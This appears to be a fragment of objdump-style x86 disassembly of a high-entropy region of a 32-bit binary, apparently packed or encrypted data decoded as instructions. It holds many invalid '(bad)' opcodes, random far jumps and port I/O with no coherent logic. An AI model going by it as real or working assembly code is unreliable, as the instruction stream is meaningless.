  4188d3:	add    BYTE PTR [eax],al
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi+0x209c3acd]
  4188e3:	fwait
  4188e4:	push   edx
  4188e5:	jl     0x41894e
  4188e7:	or     BYTE PTR [ecx],al
  4188e9:	add    BYTE PTR [eax],al
  4188eb:	add    DWORD PTR [eax],eax
  4188ed:	add    BYTE PTR [ecx-0x16],cl
  4188f0:	lahf   
  4188f1:	in     al,dx
  4188f2:	in     eax,dx
  4188f3:	sub    DWORD PTR [ebx],edx
  4188f5:	jmp    0x25d2:0xca6dd714
  4188fc:	dec    ebp
  4188fd:	mov    esp,0x9e86b133
  418902:	mov    eax,DWORD PTR [ebp-0x2e06c18c]
  418908:	pop    edi
  418909:	pop    es
  41890a:	xor    DWORD PTR [eax+0xb8d5462],ebx
  418910:	(bad)  
  418911:	jno    0x418924
  418913:	xor    BYTE PTR [edi],bh
  418915:	call   0x6a0d1150
  41891a:	mov    eax,ds:0x36b2dce8
  41891f:	fnstenv [esi]
  418921:	sbb    eax,0xd1f64260
  418926:	dec    esi
  418927:	inc    ecx
  418928:	lods   al,BYTE PTR ds:[esi]
  418929:	sbb    DWORD PTR [ebx+edi*8+0x3af8b700],eax
  418930:	jno    0x418912
  418932:	daa    
  418933:	(bad)  
  418934:	push   cs
  418935:	outs   dx,DWORD PTR ds:[esi]
  418936:	out    0x8,al
  418938:	inc    ecx
  418939:	in     eax,dx
  41893a:	sub    al,0x7a
  41893c:	mov    eax,ds:0x253cd4db
  418941:	or     al,0x6a
  418943:	jmp    0x75fe:0xa9ce961f
  41894a:	pop    esi
  41894b:	pcmpgtw mm3,QWORD PTR [esi+0x54149837]
  418952:	arpl   WORD PTR [ebx*4+0x7b51021f],ax
  418959:	mov    edx,0xf36aab1b
  41895e:	aaa    
  41895f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418960:	cli    
  418961:	xlat   BYTE PTR ds:[ebx]
  418962:	sbb    edx,DWORD PTR [ebx]
  418964:	sub    BYTE PTR [ebp+0x6ee0b0d0],al
  41896a:	and    DWORD PTR [eax],edx
  41896c:	inc    esi
  41896d:	cwde   
  41896e:	mov    bh,0x9c
  418970:	pop    edx
  418971:	jg     0x4189b1
  418973:	mov    bh,BYTE PTR [esi+0x2c]
  418976:	mov    dh,0x74
  418978:	pusha  
  418979:	ss int3 
  41897b:	add    eax,0x7ae8fbbc
  418980:	xor    BYTE PTR [ebp+eax*4-0xf],dl
  418984:	mov    ah,0x44
  418986:	out    dx,eax
  418987:	push   ebp
  418988:	in     al,0x4b
  41898a:	adc    ebx,DWORD PTR [eax+0x31]
  41898d:	adc    eax,0xed487cb0
  418992:	mov    dh,0xe8
  418994:	xor    bh,dh
  418996:	(bad)  
  418997:	cwde   
  418998:	lea    esi,[ecx-0x46fad1b2]
  41899e:	pop    esi
  41899f:	cmp    edi,ebx
  4189a1:	inc    ebp
  4189a2:	daa    
  4189a3:	lea    ecx,[esi]
  4189a5:	cwde   
  4189a6:	cmp    DWORD PTR [edx+0x1cf932e1],0x4b
  4189ad:	stos   DWORD PTR es:[edi],eax
  4189ae:	sbb    al,0x46
  4189b0:	mov    DWORD PTR [ebp+0x28c3aa3b],ebp
  4189b6:	shr    BYTE PTR [edi+0x8],0xc3
  4189ba:	sub    dh,BYTE PTR [esi+eax*4-0x19bed176]
  4189c1:	data16 jecxz 0x418961
  4189c4:	inc    ebp
  4189c5:	push   cs
  4189c6:	adc    ebx,DWORD PTR [esi+0x63]
  4189c9:	int    0x12
  4189cb:	lods   eax,DWORD PTR ds:[esi]
  4189cc:	dec    esp
  4189cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ce:	scas   al,BYTE PTR es:[edi]
  4189cf:	mov    esi,0x429f455b
  4189d4:	shl    dl,cl
  4189d6:	mov    eax,0xc5e0350d
  4189db:	imul   esi,DWORD PTR ds:0x1a2ac340,0x6c
  4189e2:	ins    BYTE PTR es:[edi],dx
  4189e3:	and    eax,0xf61ad329
  4189e8:	push   ebx
  4189e9:	push   ebx
  4189ea:	jnp    0x4189af
  4189ec:	test   BYTE PTR [edx],0x0
	...
  418a53:	add    BYTE PTR [eax],al
  418a55:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x4a67c669
  418a65:	add    al,0x67
  418a67:	or     DWORD PTR [ecx],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    ch,dh
  418a6f:	cmp    DWORD PTR [ebx],eax
  418a71:	xchg   edi,eax
  418a72:	loopne 0x418a4f
  418a74:	pushf  
  418a75:	xchg   ebp,eax
  418a76:	dec    esp
  418a77:	imul   eax,DWORD PTR [ebp-0x6ae9a14f],0x4b
  418a7e:	inc    ebx
  418a7f:	loopne 0x418ac1
  418a81:	sub    dh,BYTE PTR [edx-0x7b4ace26]
  418a87:	jb     0x418a7f
  418a89:	push   edi
  418a8a:	scas   al,BYTE PTR es:[edi]
  418a8b:	loope  0x418b06
  418a8d:	cmp    DWORD PTR [edi],esp
  418a8f:	pop    ebp
  418a90:	cmp    eax,0x5fab7e8c
  418a95:	add    edi,ebp
  418a97:	mov    cl,0xe2
  418a99:	or     BYTE PTR [ebx+esi*2-0x3c6ee6a5],bh
  418aa0:	jecxz  0x418b0a
  418aa2:	out    dx,eax
  418aa3:	sub    ah,dh
  418aa5:	xlat   BYTE PTR ds:[ebx]
  418aa6:	inc    edi
  418aa7:	test   DWORD PTR [ebp+0x48e0671d],esp
  418aad:	cmp    dl,BYTE PTR [esi+0x51]
  418ab0:	inc    ebp
  418ab1:	dec    esi
  418ab2:	imul   esp,ecx,0x33c406da
  418ab8:	test   al,0x21
  418aba:	shl    DWORD PTR [eax-0x3d720f59],cl
  418ac0:	push   ss
  418ac1:	add    al,0xc0
  418ac3:	pop    eax
  418ac4:	emms   
  418ac6:	jl     0x418a66
  418ac8:	popa   
  418ac9:	mov    dh,0x35
  418acb:	dec    DWORD PTR [ecx+0x5d]
  418ace:	jle    0x418acd
  418ad0:	adc    DWORD PTR [edx],esp
  418ad2:	sahf   
  418ad3:	retf   
  418ad4:	rcl    BYTE PTR [ebp+0x4d],cl
  418ad7:	cmp    edx,ebx
  418ad9:	pop    esi
  418ada:	jno    0x418b56
  418adc:	cmp    edi,ecx
  418ade:	outs   dx,DWORD PTR ds:[esi]
  418adf:	es add eax,0xd8d74050
  418ae5:	clc    
  418ae6:	pushf  
  418ae7:	sub    ch,al
  418ae9:	pop    edx
  418aea:	jmp    0xb7d8:0x9c3bf01
  418af1:	xlat   BYTE PTR ds:[ebx]
  418af2:	stos   DWORD PTR es:[edi],eax
  418af3:	and    al,0xf4
  418af5:	rol    BYTE PTR [edx],1
  418af7:	lahf   
  418af8:	and    BYTE PTR [ecx+0x1a],bl
  418afb:	ret    
  418afc:	(bad)  
  418afd:	test   al,0xc3
  418aff:	out    dx,al
  418b00:	in     eax,0xfd
  418b02:	pusha  
  418b03:	adc    al,0xb2
  418b05:	fucomp st(4)
  418b07:	pop    edi
  418b08:	adc    DWORD PTR [ecx-0x55],edx
  418b0b:	arpl   WORD PTR gs:[ebp-0x47],bp
  418b0f:	sub    esp,0xe27ea41c
  418b15:	mov    cl,cl
  418b17:	pop    ebx
  418b18:	mov    ch,0xb4
  418b1a:	scas   eax,DWORD PTR es:[edi]
  418b1b:	inc    esp
  418b1c:	add    ch,dl
  418b1e:	or     DWORD PTR [eax+0x26745cc1],esp
  418b24:	gs int3 
  418b26:	(bad)  
  418b27:	jno    0x418aec
  418b29:	lods   eax,DWORD PTR ds:[esi]
  418b2a:	pop    ds
  418b2b:	mov    ecx,0xc43434a7
  418b30:	das    
  418b31:	les    edi,FWORD PTR [ecx]
  418b33:	push   ecx
  418b34:	push   0x3b
  418b36:	shl    eax,cl
  418b38:	inc    edi
  418b39:	mov    BYTE PTR [ebx],dh
  418b3b:	sub    DWORD PTR [ebp+0x33],ebp
  418b3e:	iret   
  418b3f:	cmp    BYTE PTR [esi-0x6c],ch
  418b42:	and    cl,dl
  418b44:	dec    eax
  418b45:	into   
  418b46:	hlt    
  418b47:	shl    DWORD PTR [edi+esi*2+0x6f],1
  418b4b:	jns    0x418b7a
  418b4d:	mov    esp,0x5f017786
  418b52:	push   edx
  418b53:	push   ds
  418b54:	in     eax,0xf7
  418b56:	and    BYTE PTR [edi],bh
  418b58:	cli    
  418b59:	jb     0x418b50
  418b5b:	cmp    BYTE PTR [ebx+0x1c],ah
  418b5e:	mov    cl,0x9a
  418b60:	push   ebp
  418b61:	inc    edx
  418b62:	int3   
  418b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b64:	imul   ecx,ebp,0xffffff91
  418b67:	mov    ecx,edx
  418b69:	mov    edi,0xfe116b01
	...
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x7b
  418be3:	sub    cl,ah
  418be5:	push   ss
  418be6:	or     al,BYTE PTR [bx+di]
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [edx],bh
  418bef:	xor    al,0xcd
  418bf1:	ins    DWORD PTR es:[edi],dx
  418bf2:	pop    edi
  418bf3:	xchg   esp,eax
  418bf4:	sbb    eax,esi
  418bf6:	nop/reserved BYTE PTR [esi]
  418bf9:	push   ds
  418bfa:	mov    BYTE PTR [ecx+0x5a],dl
  418bfd:	or     al,0xd
  418bff:	push   cs
  418c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c01:	push   es
  418c02:	xchg   esp,eax
  418c03:	jle    0x418ba6
  418c05:	inc    esi
  418c06:	cwde   
  418c07:	mov    dl,0xa
  418c09:	cmp    DWORD PTR [edi],ebp
  418c0b:	pop    edx
  418c0c:	mov    ebx,es
  418c0e:	jle    0x418bf3
  418c10:	xor    BYTE PTR [ebp+ecx*8-0x73],bh
  418c14:	inc    edx
  418c15:	inc    edx
  418c16:	sbb    DWORD PTR [ebx],0x1a
  418c19:	aaa    
  418c1a:	mov    dl,0x5a
  418c1c:	shl    eax,cl
  418c1e:	je     0x418c7c
  418c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c21:	mov    ebx,edi
  418c23:	(bad)  
  418c24:	jmp    0x6954:0xd8177afd
  418c2b:	je     0x418c9b
  418c2d:	add    DWORD PTR [ecx+eax*4-0x2de94d6d],ecx
  418c34:	jl     0x418ca6
  418c36:	fucomip st,st(2)
  418c38:	pop    es
  418c39:	pop    edi
  418c3a:	jae    0x418c35
  418c3c:	sub    BYTE PTR [ecx-0x519e9d8f],dh
  418c42:	cmc    
  418c43:	aad    0xfb
  418c45:	jl     0x418c6c
  418c47:	fldcw  WORD PTR [eax]
  418c49:	jg     0x418cc0
  418c4b:	inc    edi
  418c4c:	das    
  418c4d:	lahf   
  418c4e:	aas    
  418c4f:	gs sti 
  418c51:	or     al,0x85
  418c53:	ficom  WORD PTR ds:0xd789eac5
  418c59:	or     ch,BYTE PTR [edx+0x7d]
  418c5c:	adc    ecx,esi
  418c5e:	sub    BYTE PTR [bx-0x12eb],ah
  418c63:	mov    BYTE PTR [edx+0x1b9922de],cl
  418c69:	pop    ebx
  418c6a:	call   0xb9ff1b89
  418c6f:	xor    BYTE PTR [edi],0x85
  418c72:	outs   dx,DWORD PTR ds:[esi]
  418c73:	xchg   ecx,eax
  418c74:	sub    eax,0xe8996bd9
  418c79:	mov    ebx,0x2b4d80f9
  418c7e:	hlt    
  418c7f:	pop    esp
  418c80:	pandn  mm2,QWORD PTR [esi+0x76]
  418c84:	int3   
  418c85:	pop    edx
  418c86:	mov    ch,0x90
  418c88:	mov    ebx,0xf710a4a8
  418c8d:	sub    eax,0xc7155c22
  418c92:	xchg   edx,eax
  418c93:	cmp    ah,BYTE PTR [eax+ebp*1]
  418c96:	cmp    al,BYTE PTR [edi-0x73]
  418c99:	in     eax,0x1b
  418c9b:	out    dx,al
  418c9c:	fs call 0x9d98b74c
  418ca2:	(bad)
  418ca5:	dec    ebp
  418ca6:	loop   0x418d08
  418ca8:	fld    DWORD PTR [esi]
  418caa:	fs loope 0x418c84
  418cad:	dec    edx
  418cae:	leave  
  418caf:	loop   0x418cd0
  418cb1:	mov    esi,0xd7a0d8cf
  418cb6:	push   0x39
  418cb8:	rcr    BYTE PTR ds:0x40c4ef1b,1
  418cbe:	sub    dl,BYTE PTR [ebp+0xb59808f]
  418cc4:	push   ebx
  418cc5:	in     al,0xd2
  418cc7:	mov    ebp,0x5b8128eb
  418ccc:	arpl   WORD PTR [edx-0x1b1cb000],dx
  418cd2:	mov    dl,0x14
  418cd4:	cmp    BYTE PTR [ebp+0x79431683],0x48
  418cdb:	xor    al,0xc4
  418cdd:	or     BYTE PTR [eax],bh
  418cdf:	push   ss
  418ce0:	xor    DWORD PTR [ebx+0x1d],0xffffffe1
  418ce4:	or     al,0xe3
  418ce6:	push   edx
  418ce7:	xor    edi,esp
  418ce9:	and    BYTE PTR [ecx],0x5a
  418cec:	aad    0x75
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rol    BYTE PTR [edi+0x67998622],cl
  418d67:	or     eax,DWORD PTR [ecx]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    BYTE PTR [edi+0x35a2e262],dh
  418d73:	fisubr WORD PTR [ebx+ecx*1+0x4135aec2]
  418d7a:	push   fs
  418d7c:	cmp    eax,0xed852bd5
  418d81:	mov    BYTE PTR [esp+edx*1],dl
  418d84:	lds    edi,FWORD PTR [esi+0x3f]
  418d87:	cdq    
  418d88:	or     al,0xee
  418d8a:	fsub   st,st(0)
  418d8c:	fucomip st,st(5)
  418d8e:	jns    0x418d4f
  418d90:	shl    dl,cl
  418d92:	mov    ch,0x5f
  418d94:	push   ecx
  418d95:	dec    edi
  418d96:	or     bh,BYTE PTR [edx]
  418d98:	mov    ch,0x21
  418d9a:	add    esp,edi
  418d9c:	xor    cl,ah
  418d9e:	gs pop ds
  418da0:	imul   eax,ebx,0x63a77b72
  418da6:	xchg   ebx,eax
  418da7:	sbb    al,0x22
  418da9:	jmp    0x1822c291
  418dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418daf:	in     al,dx
  418db0:	sub    BYTE PTR [ecx],0x14
  418db3:	sbb    esp,edi
  418db5:	push   edi
  418db6:	jmp    0x942a:0x9ef1fae8
  418dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dbe:	outs   dx,BYTE PTR ds:[esi]
  418dbf:	cmp    BYTE PTR [ebp-0x24df9e69],dh
  418dc5:	and    eax,0x632b03f2
  418dca:	dec    edx
  418dcb:	rcr    DWORD PTR [esi+eiz*4+0x1f],1
  418dcf:	pop    eax
  418dd0:	mov    ds:0x4b8d0629,al
  418dd5:	enter  0xbbe3,0x73
  418dd9:	cmp    DWORD PTR [ecx+edx*1+0x25],esp
  418ddd:	jne    0x418dd6
  418ddf:	ret    
  418de0:	scas   eax,DWORD PTR es:[edi]
  418de1:	and    al,0x37
  418de3:	adc    ecx,DWORD PTR [eax+edx*1]
  418de6:	lock mov eax,0x7623a762
  418dec:	and    al,0xdd
  418dee:	fwait
  418def:	xor    edx,DWORD PTR [edx-0x57908522]
  418df5:	jge    0x418e45
  418df7:	add    al,0x78
  418df9:	fmul   DWORD PTR [esi+0x7]
  418dfc:	stos   DWORD PTR es:[edi],eax
  418dfd:	sbb    eax,0xf4eb1e5
  418e02:	jnp    0x418dbe
  418e04:	xor    eax,0x7516335d
  418e09:	add    ebp,eax
  418e0b:	fstp   QWORD PTR [esi-0x2e230de2]
  418e11:	sub    al,0x8b
  418e13:	dec    esi
  418e14:	pusha  
  418e15:	pop    esi
  418e16:	fadd   DWORD PTR [edi+0x23]
  418e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e1a:	sub    BYTE PTR [edx+0x4d4842c1],0x6b
  418e21:	jnp    0x418dcf
  418e23:	jle    0x418dc9
  418e25:	(bad)  
  418e26:	pop    edx
  418e27:	and    BYTE PTR [ebx-0x1b],cl
  418e2a:	cmc    
  418e2b:	mov    bl,0xb3
  418e2d:	sar    DWORD PTR [ebx],0x43
  418e30:	and    edx,DWORD PTR [esi]
  418e32:	sub    DWORD PTR [eax-0x35916e11],0x87e09f9d
  418e3c:	jmp    0x399bab18
  418e41:	lahf   
  418e42:	into   
  418e43:	push   edi
  418e44:	cmp    BYTE PTR [edi-0x2f],0xee
  418e48:	pop    es
  418e49:	mov    ebp,0x8da6eb63
  418e4e:	mov    ds:0xa040a792,eax
  418e53:	popa   
  418e54:	sbb    dh,BYTE PTR [eax-0x2913a7c1]
  418e5a:	shl    BYTE PTR [eax+0x813ed37],1
  418e60:	jle    0x418e6d
  418e62:	aam    0x1
  418e64:	push   0x73c4b7f0
  418e69:	clc    
  418e6a:	ficom  DWORD PTR [ecx+0x4f]
  418e6d:	leave  
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx-0x2]
  418ee3:	inc    eax
  418ee4:	iret   
  418ee5:	(bad)  
  418ee6:	addr16 or al,0x1
  418ee9:	add    BYTE PTR [eax],al
  418eeb:	add    DWORD PTR [eax],eax
  418eed:	add    BYTE PTR [ebx-0x7f],ah
  418ef0:	iret   
  418ef1:	or     eax,0x9ea62d47
  418ef6:	mov    ebp,DWORD PTR [edi-0x44]
  418ef9:	into   
  418efa:	call   0xbb49dff7
  418eff:	mov    fs:0xaa861e79,al
  418f05:	test   al,0xc3
  418f07:	sub    eax,0x432d6dab
  418f0c:	sub    ecx,DWORD PTR [eax-0x52ef21a2]
  418f12:	jb     0x418f0d
  418f14:	dec    edx
  418f15:	sbb    al,cl
  418f17:	inc    edi
  418f18:	sub    dl,BYTE PTR [edi+0x30]
  418f1b:	std    
  418f1c:	ins    BYTE PTR es:[edi],dx
  418f1d:	and    al,0x42
  418f1f:	fs data16 loope 0x418f02
  418f23:	scas   al,BYTE PTR es:[edi]
  418f24:	fstp   DWORD PTR [edi-0x4b]
  418f27:	xlat   BYTE PTR ds:[ebx]
  418f28:	sti    
  418f29:	pop    esp
  418f2a:	fwait
  418f2b:	push   esi
  418f2c:	add    BYTE PTR [ecx+0x6c1b0c5a],bh
  418f32:	add    DWORD PTR [esi],eax
  418f34:	aam    0x0
  418f36:	sti    
  418f37:	retf   0x863b
  418f3a:	mov    bl,0x6c
  418f3c:	das    
  418f3d:	sub    eax,0xd13dfa2b
  418f42:	bound  ebp,QWORD PTR ds:0x46a03f9c
  418f48:	mov    esp,0x50035d3
  418f4d:	mov    DWORD PTR [edi],ecx
  418f4f:	sar    BYTE PTR ds:0xd93cce26,cl
  418f55:	add    BYTE PTR [esi],ch
  418f57:	pop    es
  418f58:	push   ebx
  418f59:	arpl   cx,dx
  418f5b:	jp     0x418f0d
  418f5d:	sbb    eax,0x24b76d22
  418f62:	add    esp,ecx
  418f64:	or     dh,BYTE PTR [ecx-0x62]
  418f67:	push   0xffffff80
  418f69:	pop    ss
  418f6a:	push   ecx
  418f6b:	mov    ecx,0xd1560ecc
  418f70:	arpl   WORD PTR [edi+0x33],ax
  418f73:	sub    DWORD PTR [ebx+0x63],esi
  418f76:	sub    dh,cl
  418f78:	push   0x2e
  418f7a:	cs push ecx
  418f7c:	(bad)  
  418f7e:	pop    ss
  418f7f:	adc    edx,DWORD PTR [edx-0x72a77e9]
  418f85:	mov    edi,0x2f8ae414
  418f8a:	sahf   
  418f8b:	or     edi,edx
  418f8d:	retf   
  418f8e:	push   ds
  418f8f:	shl    BYTE PTR [ebp+0x1534d2fb],1
  418f95:	cld    
  418f96:	pop    esi
  418f97:	pop    ds
  418f98:	or     DWORD PTR [edi+eiz*2+0x12],ecx
  418f9c:	mov    ds:0xb612ec52,al
  418fa1:	adc    ebx,esp
  418fa3:	cdq    
  418fa4:	dec    esp
  418fa5:	dec    ebx
  418fa6:	imul   ebp,esi,0x735c8d2
  418fac:	pop    ds
  418fad:	imul   esp,DWORD PTR [ebp+0x5f],0x243531aa
  418fb4:	enter  0x71f1,0x91
  418fb8:	lods   eax,DWORD PTR ds:[esi]
  418fb9:	sbb    eax,0xd773aaf3
  418fbe:	push   0xffffff8c
  418fc0:	repz clc 
  418fc2:	dec    esi
  418fc3:	dec    esi
  418fc4:	inc    esp
  418fc5:	outs   dx,BYTE PTR ds:[esi]
  418fc6:	inc    ebx
  418fc7:	das    
  418fc8:	inc    edi
  418fc9:	stc    
  418fca:	inc    esi
  418fcb:	push   ds
  418fcc:	push   edi
  418fcd:	fstp   TBYTE PTR [edi-0x1]
  418fd0:	and    eax,0x4f122b3c
  418fd5:	fistp  QWORD PTR [esi-0x3ecdf27c]
  418fdb:	push   es
  418fdc:	xor    al,0x7d
  418fde:	sub    ecx,eax
  418fe0:	jbe    0x418fa4
  418fe2:	or     al,0x58
  418fe4:	mov    ss,WORD PTR [edx]
  418fe6:	sub    al,0xb
  418fe8:	imul   ebx,DWORD PTR [ebp-0x2af40644],0x0
	...
  419053:	add    BYTE PTR [eax],al
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x6deaf1a7]
  419063:	dec    eax
  419064:	jmp    0x0:0x10d6750
  41906b:	add    DWORD PTR [eax],eax
  41906d:	add    BYTE PTR [ebp+0x32],dl
  419070:	repnz push ebx
  419072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419073:	pop    ebp
  419074:	inc    esi
  419075:	mov    eax,0xc9e6ec78
  41907a:	cmc    
  41907b:	jnp    0x4190bf
  41907d:	outs   dx,DWORD PTR ds:[esi]
  41907e:	inc    edi
  41907f:	or     al,BYTE PTR [esi-0x5d]
  419082:	dec    ebp
  419083:	pop    ebp
  419084:	(bad)  
  419085:	jg     0x4190b0
  419087:	sar    DWORD PTR cs:[edx+0x673fb5b9],cl
  41908e:	push   ebp
  41908f:	mov    ecx,0x6cc92418
  419094:	lea    esi,[ecx-0x74]
  419097:	lock mov cl,0xe6
  41909a:	das    
  41909b:	xchg   edi,eax
  41909c:	cmp    edi,ebx
  41909e:	out    dx,eax
  41909f:	(bad)  
  4190a0:	call   0xf7805f3d
  4190a5:	sbb    al,0x94
  4190a7:	inc    ecx
  4190a8:	or     BYTE PTR [edi+edx*8-0x2c],dh
  4190ac:	xor    al,0xe4
  4190ae:	or     edi,DWORD PTR [eax-0x11cf12b3]
  4190b4:	addr16 jb 0x419072
  4190b7:	ss sub esp,esi
  4190ba:	les    ebp,FWORD PTR [edx+0x6cbb7543]
  4190c0:	xchg   edx,eax
  4190c1:	jb     0x419103
  4190c3:	popa   
  4190c4:	jno    0x419117
  4190c6:	xchg   esp,eax
  4190c7:	and    DWORD PTR [ebx+0x4aec29ea],ebx
  4190cd:	lds    ebx,FWORD PTR [edx+0x33]
  4190d0:	js     0x4190c6
  4190d2:	pop    ebx
  4190d3:	xchg   edx,eax
  4190d4:	adc    edi,esi
  4190d6:	sub    BYTE PTR [esi+0x2d8247cf],cl
  4190dc:	mov    al,0x35
  4190de:	call   0xa5271e3d
  4190e3:	jno    0x4190ef
  4190e5:	inc    eax
  4190e6:	xor    ebp,ebp
  4190e8:	rol    BYTE PTR [ecx+edi*2],cl
  4190eb:	dec    ecx
  4190ec:	repz inc edx
  4190ee:	add    BYTE PTR [eax+0x150f0ce6],al
  4190f4:	fld    DWORD PTR [esi-0x21a5d7a5]
  4190fa:	sub    BYTE PTR [esi-0x7783726e],0x60
  419101:	fs je  0x419115
  419104:	add    DWORD PTR cs:0x1cd1f80d,0xffffffc6
  41910c:	add    BYTE PTR [ebx],cl
  41910e:	push   ecx
  41910f:	imul   edx,DWORD PTR [esi-0x32],0x9e4f3928
  419116:	int3   
  419117:	jmp    0x56c7:0x47e9f142
  41911e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41911f:	sbb    dl,BYTE PTR [edx]
  419121:	add    DWORD PTR [ebx-0x2cc8e813],esi
  419127:	xchg   esp,eax
  419128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419129:	jns    0x4190c2
  41912b:	bound  ecx,QWORD PTR [edx+0x346c506e]
  419131:	mov    esp,0xf12ef71
  419136:	enter  0xb293,0x4c
  41913a:	sbb    ah,BYTE PTR [ebx-0x68]
  41913d:	xlat   BYTE PTR ds:[ebx]
  41913e:	push   edi
  41913f:	and    ah,BYTE PTR [edx+0x5be419e3]
  419145:	sbb    DWORD PTR cs:[ebp-0x10],0x2dfd7e4f
  41914d:	or     eax,0x8f4ffdaf
  419152:	cwde   
  419153:	in     al,0xa3
  419155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419156:	call   0x4fa60e19
  41915b:	sbb    BYTE PTR [ecx-0x29e3960b],dl
  419161:	xchg   edi,eax
  419162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419163:	jae    0x41910c
  419165:	xor    DWORD PTR [edi-0x39],edx
  419168:	sbb    BYTE PTR [esp+esi*4+0xdcd135],0x0
	...
  4191d4:	add    BYTE PTR [eax],al
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     al,bl
  4191e3:	lock jbe 0x419215
  4191e6:	addr16 push cs
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	cmp    bl,BYTE PTR [ebx]
  4191f0:	inc    esp
  4191f1:	add    DWORD PTR [edx],0x1d5dd75c
  4191f7:	jmp    0xb6c5:0x4e8cfa17
  4191fe:	scas   al,BYTE PTR es:[edi]
  4191ff:	pop    eax
  419200:	adc    al,0xa0
  419202:	fs mov esp,0xa7788274
  419208:	cmp    ch,BYTE PTR [ebx]
  41920a:	cli    
  41920b:	cmp    dh,BYTE PTR [esi]
  41920d:	js     0x419284
  41920f:	xor    BYTE PTR [edi+ebp*4+0x7e021eb3],bh
  419216:	retf   0xfa51
  419219:	add    ch,BYTE PTR [edx+0x47]
  41921c:	add    dl,BYTE PTR [edx+0x11ccfeea]
  419222:	xchg   esp,eax
  419223:	cmp    al,0xc6
  419225:	jb     0x41925d
  419227:	xchg   esi,eax
  419228:	dec    ecx
  419229:	and    esp,0xd
  41922c:	xlat   BYTE PTR ds:[ebx]
  41922d:	push   esi
  41922e:	loopne 0x4192a6
  419230:	push   es
  419231:	jecxz  0x41927b
  419233:	inc    eax
  419234:	jo     0x419262
  419236:	jae    0x419285
  419238:	clc    
  419239:	dec    ebx
  41923a:	inc    ecx
  41923b:	push   eax
  41923c:	outs   dx,DWORD PTR ds:[esi]
  41923d:	lock jnp 0x4192a3
  419240:	sbb    al,0x45
  419242:	cs jns 0x419208
  419245:	xchg   esp,eax
  419246:	outs   dx,DWORD PTR ds:[esi]
  419247:	pusha  
  419248:	mov    dl,0xaf
  41924a:	jecxz  0x4192be
  41924c:	lahf   
  41924d:	cmp    ecx,DWORD PTR [esi+0x2513a9ec]
  419253:	or     eax,edi
  419255:	sti    
  419256:	cmp    BYTE PTR [edi-0x21196763],dl
  41925c:	loope  0x419230
  41925e:	pop    esp
  41925f:	popa   
  419260:	nop
  419261:	jae    0x41929b
  419263:	imul   edx,ecx,0x6c
  419266:	call   0x8d5:0x1aa28da7
  41926d:	inc    edx
  41926e:	outs   dx,DWORD PTR ds:[esi]
  41926f:	nop
  419270:	cdq    
  419271:	aad    0xd8
  419273:	mov    ah,0x82
  419275:	push   edx
  419276:	std    
  419277:	and    dh,BYTE PTR [edx+0x46322cbf]
  41927d:	push   0x57
  41927f:	hlt    
  419280:	mov    ah,0x16
  419282:	add    bl,BYTE PTR [eax-0x7668b687]
  419288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419289:	jnp    0x419267
  41928b:	push   ecx
  41928c:	fistp  QWORD PTR [eax]
  41928e:	cli    
  41928f:	mov    ch,BYTE PTR [ecx-0x5f]
  419292:	mov    al,ds:0x305ba755
  419297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419298:	shr    DWORD PTR [eax+eiz*8-0x75],0xb3
  41929d:	push   ebx
  41929e:	mov    ecx,0xa2f91d1c
  4192a3:	adc    eax,0x61463d03
  4192a8:	and    al,0x13
  4192aa:	add    cl,ah
  4192ac:	stos   DWORD PTR es:[edi],eax
  4192ad:	nop
  4192ae:	push   0xfffffffa
  4192b0:	das    
  4192b1:	test   BYTE PTR [edx+0x6f],bl
  4192b4:	fiadd  DWORD PTR ds:0x5a764632
  4192ba:	or     bh,ah
  4192bc:	cwde   
  4192bd:	sbb    al,0x1a
  4192bf:	mov    bl,0x87
  4192c1:	clc    
  4192c2:	ins    DWORD PTR es:[edi],dx
  4192c3:	das    
  4192c4:	jle    0x4192c5
  4192c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192c7:	mov    esp,0x7546807b
  4192cc:	push   ecx
  4192cd:	jnp    0x4192ee
